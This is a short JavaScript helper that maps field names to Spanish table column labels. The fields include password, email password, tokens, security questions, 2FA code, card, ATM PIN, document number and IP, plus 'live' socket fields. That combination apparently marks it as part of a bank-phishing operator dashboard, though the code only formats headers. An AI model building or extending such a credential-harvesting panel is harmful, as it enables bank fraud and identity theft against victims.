const listFiltered = ['nameBank', 'liveData', 'userRef', '__v', 'userAgent', 'additionalData', 'socketID', 'modeLive', 'isLiveLoading']
const traductionFiltered = {
    username: 'USUARIO',
    password: 'CLAVE',
    correo: 'CORREO',
    claveCorreo: 'CLAVE CORREO',
    celular: 'CELULAR',
    token1: 'TOKEN 1',
    token2: 'TOKEN 2',
    token3: 'TOKEN 3',
    question1: 'PREGUNTA 1',
    question2: 'PREGUNTA 2',
    question3: 'PREGUNTA 3',
    question4: 'PREGUNTA 4',
    factor: '2FACTOR',
    tarjeta: 'TARJETA',
    nameBankCard: 'NOMBRE BANCO',
    nameTitle: 'TITULAR',
    address: 'DIRECCION',
    city: 'CIUDAD',
    country: 'PAIS',
    originTravel: 'ORIGEN',
    destinyTravel: 'DESTINO',
    typeDocument: 'TIPO DOCUMENTO',
    nroDocument: 'DNI',
    online: 'CONECTADO',
    image: 'IMAGEN',
    atmPassword: 'ATM',
    method: 'METODO',   
    ip: 'IP'
}
export const tableHeaderFilter = (arrHeader) => arrHeader.map( e => {
    // if(e == 'ip') return null
    return listFiltered.includes(e) ? false : [e, traductionFiltered[e] ?? e] 
}).filter(e => e)